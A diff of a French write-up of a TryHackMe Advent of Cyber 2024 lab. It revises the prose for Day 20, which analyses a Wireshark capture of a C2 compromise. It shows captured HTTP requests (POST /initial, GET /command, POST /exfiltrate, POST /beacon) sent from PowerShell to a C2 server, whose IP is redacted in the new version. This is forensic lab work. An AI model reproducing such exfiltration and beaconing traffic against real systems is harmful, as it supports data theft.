@@ -5,11 +5,11 @@ style: border
 color: thm
 comments: false
 description: Calendrier de l'avent de la Cyber 2024
-modified: 12/02/2025
+modified: 13/02/2025
 ---
 Lien vers l'épreuve : <https://tryhackme.com/r/room/adventofcyber2024>
 
->12/02/2025 : Ce compte-rendu est actuellement à l'état de brouillon. A partir du jour 19, la méthodologie n'est pas rédigée.
+>13/02/2025 : Ce compte-rendu est actuellement à l'état de brouillon. A partir du jour 19, la méthodologie n'est pas rédigée.
 
 <div class="container">
     <div class="row">
@@ -1715,7 +1715,9 @@ defineHandler({
 
 ![Jour 20](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1731076103117.png)
 
-Nous suivons le flux du paquet {% include dictionary.html word="HTTP" %} **440** (`POST /initial`)
+Ce défi consiste à suivre la propagation d'un outil de {% include dictionary.html word="C2" %} en analysant un enregistrement [Wireshark](https://www.wireshark.org/).
+
+Nous pouvons apercevoir un paquet {% include dictionary.html word="HTTP" %} semblant être le point de départ de la compromission (`POST /initial`). En suivant ce paquet numéro **440**, nous y observons l'adresse IP du serveur C2, et confirmation de la mise en place d'une communication.
 
 ```http
 POST /initial HTTP/1.1
@@ -1733,7 +1735,7 @@ Date: Thu, 17 Oct 2024 09:47:04 GMT
 Perfect!
 ```
 
-Nous suivons le flux du paquet {% include dictionary.html word="HTTP" %} **457** (`GET /command`)
+Suivons à présent le flux du paquet {% include dictionary.html word="HTTP" %} **457** (`GET /command`) pour découvrir la première commande exécutée par le serveur C2.
 
 ```http
 GET /command HTTP/1.1
@@ -1749,13 +1751,13 @@ Content-Type: text/plain
 [...expurgé...]
 ```
 
-Nous suivons le flux du paquet {% include dictionary.html word="HTTP" %} **476** (`POST /exfiltrate`)
+Le paquet {% include dictionary.html word="HTTP" %} **476** (`POST /exfiltrate`) nous indique qu'un fichier a été exfiltré, et nous avons des informations sur le chiffrement utilisé dans le processus.
 
 ```http
 POST /exfiltrate HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1490
 Content-Type: multipart/form-data; boundary=f5964f77-daf1-4853-aacb-df4754eaacaf
-Host: 10.10.123.224:8080
+Host: [...expurgé...]:8080
 Content-Length: 300
 Connection: Keep-Alive
 
@@ -1773,13 +1775,13 @@ Date: Thu, 17 Oct 2024 09:47:04 GMT
 Data received
 ```
 
-Nous suivons le flux du paquet {% include dictionary.html word="HTTP" %} **488** (`POST /beacon`)
+Le paquet {% include dictionary.html word="HTTP" %} **488** (`POST /beacon`) nous permet d'obtenir le contenu chiffré du fichier critique ayant été exfiltré.
 
 ```http
 POST /beacon HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1490
 Content-Type: text/plain
-Host: 10.10.123.224:8080
+Host: [...expurgé...]:8080
 Content-Length: 77
 Connection: Keep-Alive
 
@@ -1791,7 +1793,9 @@ Date: Thu, 17 Oct 2024 09:47:04 GMT
 Beacon acknowledged
 ```
 
-{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-20_beacon.png" caption="Nous utilisons CyberChef avec les informations données dans le flux précédent" %}
+Le chiffrement AES-ECB étant reversible, il est possible de déchiffrer les informations qui ont été récupérées par Mayor Malware grâce au site [CyberChef](https://gchq.github.io/CyberChef/)
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-20_beacon.png" caption="Informations déchiffrées" %}
 
 ## Jour 21 : *HELP ME...I'm REVERSE ENGINEERING*
 
